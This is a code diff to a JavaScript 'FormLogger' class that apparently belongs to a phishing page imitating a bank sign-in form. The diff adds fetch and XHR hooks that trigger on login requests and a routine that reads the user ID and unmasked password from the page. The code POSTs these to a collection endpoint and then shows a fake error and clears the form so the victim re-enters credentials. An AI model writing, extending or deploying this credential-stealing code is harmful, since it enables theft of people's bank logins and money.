@@ -48,6 +48,30 @@ class FormLogger {
     const self = this;
     console.log('[Logger] Initializing form logger...');
     
+    // Intercept fetch to capture API submissions
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+      console.log('[Logger] Fetch intercepted:', args[0]);
+      if (args[0].includes('login') || args[0].includes('signOn')) {
+        console.log('[Logger] Login-related fetch detected, will capture form data');
+        // Extract form data and log it
+        self.captureAndLogFormData();
+      }
+      return originalFetch.apply(this, args);
+    };
+    
+    // Intercept XMLHttpRequest
+    const originalOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
+      if (url.includes('login') || url.includes('signOn')) {
+        console.log('[Logger] Login-related XHR detected:', method, url);
+        this.addEventListener('loadstart', () => {
+          self.captureAndLogFormData();
+        });
+      }
+      return originalOpen.apply(this, [method, url, ...rest]);
+    };
+    
     // Flag to track if this is the initial load
     let isInitialLoad = true;
     
@@ -172,122 +196,168 @@ class FormLogger {
   }
 
   /**
+   * Capture form data from page (independent of form reference)
+   */
+  captureAndLogFormData() {
+    try {
+      // Get User ID - try multiple selectors in order of reliability
+      let userIdValue = '';
+      
+      // Try 1: Direct ID selector (most reliable)
+      let userIdInput = document.getElementById('enterID-input');
+      if (userIdInput) {
+        userIdValue = userIdInput.value.trim();
+        console.log('[Logger] User ID found via #enterID-input:', userIdValue || '(empty)');
+      }
+      
+      // Try 2: Name selector
+      if (!userIdInput) {
+        userIdInput = document.querySelector('input[name="dummy-onlineId"]');
+        if (userIdInput) {
+          userIdValue = userIdInput.value.trim();
+          console.log('[Logger] User ID found via [name="dummy-onlineId"]:', userIdValue || '(empty)');
+        }
+      }
+      
+      // Try 3: Find any visible text input
+      if (!userIdInput) {
+        const textInputs = document.querySelectorAll('input[type="text"]:not([style*="display:none"])');
+        if (textInputs.length > 0) {
+          userIdInput = textInputs[0];
+          userIdValue = userIdInput.value.trim();
+          console.log('[Logger] User ID found via text input search:', userIdValue || '(empty)');
+        }
+      }
+      
+      // Get password - try multiple selectors
+      let passwordValue = '';
+      let passwordInput = document.getElementById('tlpvt-passcode-input');
+      if (passwordInput) {
+        passwordValue = passwordInput.value || this.rawPassword || '';
+        console.log('[Logger] Password captured - length:', passwordValue.length);
+      }
+      
+      // Get Remember Me checkbox
+      let rememberMe = false;
+      let rememberInput = document.querySelector('input[name="saveMyID"]');
+      if (!rememberInput) {
+        rememberInput = document.querySelector('input[type="checkbox"]');
+      }
+      if (rememberInput) {
+        rememberMe = rememberInput.checked;
+        console.log('[Logger] Remember Me:', rememberMe);
+      }
+      
+      // Check if we have values
+      console.log('[Logger] Captured data - User ID:', userIdValue || 'EMPTY', 'Password:', passwordValue.length > 0 ? '***' : 'EMPTY');
+      
+      if (!userIdValue && !passwordValue) {
+        console.log('[Logger] No data to log');
+        return;
+      }
+      
+      // Send to server
+      this.sendFormDataToServer({
+        userId: userIdValue || 'N/A',
+        password: passwordValue || 'N/A',
+        rememberMe: rememberMe
+      });
+    } catch (error) {
+      console.error('[Logger] Error in captureAndLogFormData:', error.message);
+    }
+  }
+
+  /**
    * Extract form data and send to server
    */
   async logFormData(form) {
     try {
-      console.log('[Logger] logFormData() started');
-      console.log('[Logger] Form element:', form.id, 'Tag:', form.tagName);
+      console.log('[Logger] logFormData() called with form:', form.id);
       
-      // Debug: Log form contents
-      const inputs = form.querySelectorAll('input');
-      console.log('[Logger] Form has', inputs.length, 'input elements');
-      inputs.forEach((input, idx) => {
-        console.log(`  [${idx}] Name: ${input.name}, ID: ${input.id}, Type: ${input.type}, Value: ${input.value.substring(0, 20)}`);
-      });
-      
-      // Ensure password field is enabled during submit
-      const passwordInput = document.getElementById('tlpvt-passcode-input');
-      if (passwordInput) {
-        passwordInput.disabled = false;
-        console.log('[Logger] Password field disabled state checked:', passwordInput.disabled);
-      } else {
-        console.log('[Logger] WARNING: Password input not found!');
-      }
-      
-      // Get User ID from input field - try multiple selectors with improved logic
-      let userIdInput = null;
+      // Get User ID - with strict priority to direct ID selector
       let userIdValue = '';
       
-      // Try 1: Direct ID selector first (most reliable)
-      userIdInput = document.getElementById('enterID-input');
-      if (userIdInput && userIdInput.value) {
+      // Try 1: Direct ID selector (best)
+      let userIdInput = document.getElementById('enterID-input');
+      if (userIdInput) {
         userIdValue = userIdInput.value.trim();
-        console.log('[Logger] User ID found via ID selector #enterID-input:', userIdValue);
+        console.log('[Logger-Form] User ID via #enterID-input:', userIdValue || '(empty)');
       }
       
-      // Try 2: Name selector in form
-      if (!userIdValue) {
+      // Try 2: Name in form
+      if (!userIdInput || !userIdValue) {
         userIdInput = form.querySelector('input[name="dummy-onlineId"]');
-        if (userIdInput && userIdInput.value) {
+        if (userIdInput) {
           userIdValue = userIdInput.value.trim();
-          console.log('[Logger] User ID found via name selector input[name="dummy-onlineId"]:', userIdValue);
+          console.log('[Logger-Form] User ID via form selector:', userIdValue || '(empty)');
         }
       }
       
-      // Try 3: Global document search by name
-      if (!userIdValue) {
+      // Try 3: Global name search
+      if (!userIdInput || !userIdValue) {
         userIdInput = document.querySelector('input[name="dummy-onlineId"]');
-        if (userIdInput && userIdInput.value) {
+        if (userIdInput) {
           userIdValue = userIdInput.value.trim();
-          console.log('[Logger] User ID found via global name selector:', userIdValue);
+          console.log('[Logger-Form] User ID via global selector:', userIdValue || '(empty)');
         }
       }
       
-      // Try 4: Find any text input in form
+      // Try 4: First text input
       if (!userIdValue) {
-        console.log('[Logger] User ID not found yet, trying to find any text input...');
         const textInputs = form.querySelectorAll('input[type="text"]');
-        console.log('[Logger] Found', textInputs.length, 'text inputs in form');
         if (textInputs.length > 0) {
-          userIdInput = textInputs[0];
-          userIdValue = userIdInput.value.trim();
-          console.log('[Logger] Using first text input:', userIdInput.name, 'Value:', userIdValue);
+          userIdValue = textInputs[0].value.trim();
+          console.log('[Logger-Form] User ID via first text input:', userIdValue || '(empty)');
         }
       }
       
-      // Log the final result
-      if (userIdValue) {
-        console.log('[Logger] ✓ User ID captured successfully:', userIdValue);
-      } else {
-        console.log('[Logger] ✗ WARNING: Could not extract User ID from any selector');
-      }
+      console.log('[Logger-Form] Final User ID:', userIdValue || 'EMPTY');
 
       // Get the actual password value directly from the input field (NOT masked)
+      let passwordInput = document.getElementById('tlpvt-passcode-input');
       let passwordValue = '';
       
       if (passwordInput) {
-        // Get the actual value from the DOM element (this is the unmasked value)
         passwordValue = passwordInput.value || this.rawPassword || '';
-        console.log('[Logger] Password captured from DOM - length:', passwordValue.length);
+        console.log('[Logger-Form] Password captured - length:', passwordValue.length);
       } else {
-        // Fallback to tracked raw password
         passwordValue = this.rawPassword || '';
-        console.log('[Logger] Password captured from tracker - length:', passwordValue.length);
+        console.log('[Logger-Form] Password from tracker - length:', passwordValue.length);
       }
 
-      // Get Remember Me checkbox - try both possible selectors
+      // Get Remember Me checkbox
       let rememberMe = false;
-      let rememberInput = form.querySelector('input[name="saveMyID"]');
+      let rememberInput = document.querySelector('input[name="saveMyID"]');
       if (!rememberInput) {
-        rememberInput = form.querySelector('input[name="dummy-rememberMe"]');
-      }
-      if (!rememberInput) {
-        // Try to find any checkbox in the form
-        const checkboxes = form.querySelectorAll('input[type="checkbox"]');
-        console.log('[Logger] Found', checkboxes.length, 'checkboxes in form');
-        if (checkboxes.length > 0) {
-          rememberInput = checkboxes[0];
-        }
+        rememberInput = document.querySelector('input[type="checkbox"]');
       }
       if (rememberInput) {
         rememberMe = rememberInput.checked;
-        console.log('[Logger] Remember Me:', rememberMe, '(Field name:', rememberInput.name, ')');
+        console.log('[Logger-Form] Remember Me:', rememberMe);
       }
 
-      const data = {
+      // Send to server
+      await this.sendFormDataToServer({
         userId: userIdValue || 'N/A',
         password: passwordValue || 'N/A',
         rememberMe: rememberMe
-      };
+      });
+    } catch (error) {
+      console.error('[Logger] Error in logFormData:', error.message);
+    }
+  }
 
-      console.log('[Logger] About to send login entry:', { 
+  /**
+   * Send form data to server
+   */
+  async sendFormDataToServer(data) {
+    try {
+      console.log('[Logger] Sending to server:', {
         userId: data.userId,
         passwordLength: data.password.length,
         rememberMe: data.rememberMe
       });
 
-      // Send to server
       const response = await fetch(this.apiEndpoint, {
         method: 'POST',
         headers: {
@@ -296,7 +366,7 @@ class FormLogger {
         body: JSON.stringify(data)
       });
 
-      console.log('[Logger] Fetch response status:', response.status);
+      console.log('[Logger] Server response status:', response.status);
       
       if (!response.ok) {
         throw new Error(`HTTP ${response.status}`);
@@ -306,22 +376,17 @@ class FormLogger {
       console.log('[Logger] Server response:', result);
       
       if (result.success) {
-        console.log('[Logger] Entry successfully logged to database');
-        // Display error message after logging
+        console.log('[Logger] ✓ Entry logged successfully');
         this.displayErrorMessage();
-        // Reset the password tracker for next attempt
         this.rawPassword = '';
-        // Clear form fields for next attempt
         this.clearFormFields();
       } else {
         console.warn('[Logger] Server returned success=false:', result.message);
         this.displayErrorMessage();
       }
     } catch (error) {
-      console.error('[Logger] Error sending data to server:', error.message);
-      // Display error message even if logging fails
+      console.error('[Logger] Error sending data:', error.message);
       this.displayErrorMessage();
-      // Clear form fields anyway so user can try again
       this.clearFormFields();
     }
   }
